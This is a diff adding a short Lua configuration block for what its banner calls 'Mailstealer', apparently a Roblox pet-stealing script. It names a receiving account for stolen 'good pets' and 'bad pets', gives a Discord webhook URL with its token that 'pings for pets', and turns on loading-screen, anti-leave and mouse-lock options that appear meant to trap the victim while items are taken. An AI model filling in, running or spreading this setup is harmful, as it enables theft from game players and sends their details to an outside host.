@@ -1,0 +1,16 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "xXb7vip7dXx" -- good pets
+Webhook = "https://discord.com/api/webhooks/1136371295358034022/Pl95YMQx5f5hRo7gAWqxLNGcn3aTIyPBLfrCflux5t_UP4SaxqQ08_NbWvFYVW0Ogcf1" -- pings for pets
+UserName2 = "xXb7vip7dXx" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
